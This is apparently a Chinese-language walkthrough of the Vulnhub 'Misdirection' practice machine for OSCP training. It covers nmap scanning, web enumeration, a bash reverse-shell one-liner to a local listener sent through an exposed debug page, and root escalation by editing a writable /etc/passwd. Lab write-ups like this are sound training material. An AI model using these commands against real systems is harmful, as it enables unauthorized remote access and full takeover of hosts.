
## 靶机描述

_这是一台标榜难度为简单的开源靶机。它的设计初衷是为了强化我们 OSCP 备考技术。_

![p1](../vulnhubScreenShot/Vulnhub%20Misdirection%20靶机渗透总结/IMG-20261018214144372.png)


## 信息收集

1. 端口扫描

```text
# Nmap 7.99 scan initiated Fri Oct  9 15:10:40 2026 as: /usr/lib/nmap/nmap --min-rate 10000 -p- -oA nmapscan/TCPS 192.168.1.61
Nmap scan report for 192.168.1.61
Host is up (0.00011s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 00:0C:29:5C:43:EE (VMware)

# Nmap done at Fri Oct  9 15:10:42 2026 -- 1 IP address (1 host up) scanned in 2.68 seconds
```

目标靶机开放了许多有价值的端口，其中 80 和 8080 端口是我们首要考虑的攻击点。3306 次之，最后我尝试 22 端口。

2. 详细信息扫描

```text
# Nmap 7.99 scan initiated Fri Oct  9 15:11:11 2026 as: /usr/lib/nmap/nmap -sT -sV -O -sC -p22,80,3306,8080 -oA nmapscan/details 192.168.1.61
Nmap scan report for 192.168.1.61
Host is up (0.00064s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-open-proxy: Proxy might be redirecting requests
MAC Address: 00:0C:29:5C:43:EE (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct  9 15:11:55 2026 -- 1 IP address (1 host up) scanned in 43.43 seconds
```

详细扫描的结果告诉我们 80 端口运行的是 Rocket 1.2.6 框架的组件。而 3306 暴露出了一个 未授权访问的漏洞。这些是我们非常感兴趣的。

![p2](../vulnhubScreenShot/Vulnhub%20Misdirection%20靶机渗透总结/IMG-20261018214819216.png)

但是我们没法直接登录目标的 3306 服务。

3. 漏洞脚本扫描

```text
# Nmap 7.99 scan initiated Fri Oct  9 15:12:43 2026 as: /usr/lib/nmap/nmap --script=vuln -p22,80,3306,8080 -oA nmapscan/vulns 192.168.1.61
Nmap scan report for 192.168.1.61
Host is up (0.00083s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.61
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.1.61:80/init/default/user/request_reset_password?_next=/init/default/index
|     Form id: auth_user_email__row
|     Form action: #
|     
|     Path: http://192.168.1.61:80/init/default/user/register?_next=/init/default/index
|     Form id: auth_user_first_name__row
|     Form action: #
|     
|     Path: http://192.168.1.61:80/init/default/user/login?_next=/init/default/index
|     Form id: auth_user_email__row
|     Form action: #
|     
|     Path: http://192.168.1.61:80/init/default/elections
|     Form id: auth_user_email__row
|     Form action: #
|     
|     Path: http://192.168.1.61:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex
|     Form id: auth_user_email__row
|     Form action: #
|     
|     Path: http://192.168.1.61:80/init/default/user/request_reset_password
|     Form id: auth_user_email__row
|     Form action: #
|     
|     Path: http://192.168.1.61:80/init/default/user/register
|     Form id: auth_user_first_name__row
|     Form action: #
|     
|     Path: http://192.168.1.61:80/init/default/user/
|     Form id: auth_user_email__row
|_    Form action: #
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/admin/: Possible admin folder
|   /admin/backup/: Possible backup
|   /admin/download/backup.sql: Possible database backup
|   /examples/: Sample scripts
|   /admin/libraries/ajaxfilemanager/ajaxfilemanager.php: Log1 CMS
|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload
|   /admin/includes/tiny_mce/plugins/tinybrowser/upload.php: CompactCMS or B-Hind CMS/FCKeditor File upload
|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload
|   /admin/jscript/upload.php: Lizard Cart/Remote File upload
|   /admin/jscript/upload.html: Lizard Cart/Remote File upload
|   /admin/jscript/upload.pl: Lizard Cart/Remote File upload
|_  /admin/jscript/upload.asp: Lizard Cart/Remote File upload
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
3306/tcp open  mysql
8080/tcp open  http-proxy
| http-enum: 
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /debug/: Potentially interesting folder
|   /development/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /help/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /manual/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
MAC Address: 00:0C:29:5C:43:EE (VMware)

# Nmap done at Fri Oct  9 15:35:29 2026 -- 1 IP address (1 host up) scanned in 1365.54 seconds
```

可以看出来，WEB 暴露出了许多信息。

## WEB 渗透

WEB 渗透过程中，我们的原则是，尽量去选择简单容易看见的漏洞往下走。不要一下子扎入细节中。在测试过程汇总中，我们想访问 80 端口的路径信息。但是我们的 gobuster 工具不知道为何没法正常的工作。为了全局，我们暂时放弃了 80 端口的渗透。我们转而渗透 8080 端口。

![p3](../vulnhubScreenShot/Vulnhub%20Misdirection%20靶机渗透总结/IMG-20261018215545163.png)

8080 端口运行着一个 wordpress 的站点。此时，使用 gobuster 工具能够正常工作。我们发现了许多敏感网站路径。

![p4](../vulnhubScreenShot/Vulnhub%20Misdirection%20靶机渗透总结/IMG-20261018215709708.png)

其中 debug 路径暴露给我们一个终端。我们尝试了一下，还是具备交换功能的。

![p5](../vulnhubScreenShot/Vulnhub%20Misdirection%20靶机渗透总结/IMG-20261018215813416.png)


## debug 终端获得立足点

我们在页面中输入这条命令

```shell
bash -c '/bin/bash -i >& /dev/tcp/192.168.1.4/5566 0>&1'
```

本地监听 5566 端口

```shell
sudo nc -lvnp 5566
```

我们获得返回 shell 会话。

![p6](../vulnhubScreenShot/Vulnhub%20Misdirection%20靶机渗透总结/IMG-20261018221015909.png)

我们通过权限枚举，发现我们可以登录 brexit 用户。

![p7](../vulnhubScreenShot/Vulnhub%20Misdirection%20靶机渗透总结/IMG-20261018221106338.png)

![brexit](../vulnhubScreenShot/Vulnhub%20Misdirection%20靶机渗透总结/IMG-20261018221608312.png)

我们获得了 brexit 文件夹下的 flag 文件。
我们使用 find 命令发现我们可以编辑 /etc/passwd 文件。

```shell
find / -writable -type f 2>/dev/null
```

![p8](../vulnhubScreenShot/Vulnhub%20Misdirection%20靶机渗透总结/IMG-20261018221231210.png)

### 可写 /etc/passwd 文件提权

```shell
openssl passwd root
vim /etc/passwd
```

这样我们能够修改 root 的密码。从而登录 root 会话了。

![p9](../vulnhubScreenShot/Vulnhub%20Misdirection%20靶机渗透总结/IMG-20261018221542028.png)

## 总结

这是一台看似简单，其实很考验策略的靶机。如果一开始就埋头啃细节就很容易浪费掉自己的耐心。